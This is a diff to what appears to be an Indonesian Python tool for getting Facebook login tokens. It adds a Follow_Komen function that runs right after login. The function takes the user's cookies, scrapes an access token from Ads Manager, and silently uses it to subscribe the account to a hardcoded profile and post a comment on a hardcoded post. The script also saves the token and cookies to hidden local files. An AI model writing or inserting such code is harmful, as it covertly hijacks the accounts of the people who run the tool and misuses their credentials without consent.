@@ -426,9 +426,10 @@ def login_lagi334():
                             response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
                             access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
                             Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{access_token}""",width=80, style=f"{color_panel}", title="[bold green]>[hot_pink2] (PILIHAN) [bold green]<"))
+                            Follow_Komen()
                             tokenew = open(".token.txt","w").write(access_token)
                             cook= open(".cok.txt","w").write(your_cookies)
-                            followdong()
+                            
                             Console().print("[bold cyan]   ╰─> [bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]");time.sleep(5)
                             time.sleep(3)
                             back()
@@ -440,6 +441,26 @@ def login_lagi334():
                 time.sleep(3)
                 exit()
     except:pass
+
+def Follow_Komen():
+	try:
+		cok = input("cookies : ")
+		cookie = {'cookie':cok}
+		with requests.Session() as xyz:
+			
+			url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+			req = xyz.get(url,cookies=cookie)
+			set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+			nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+			roq = xyz.get(nek,cookies=cookie)
+			tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+			print('')
+			print(tok)
+			requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok))
+			requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom1}&access_token={tok}", headers = {"cookie":cok}) 
+	except Exception as e:
+		print(e)
+
 
 def login_lagi335():
 	try:
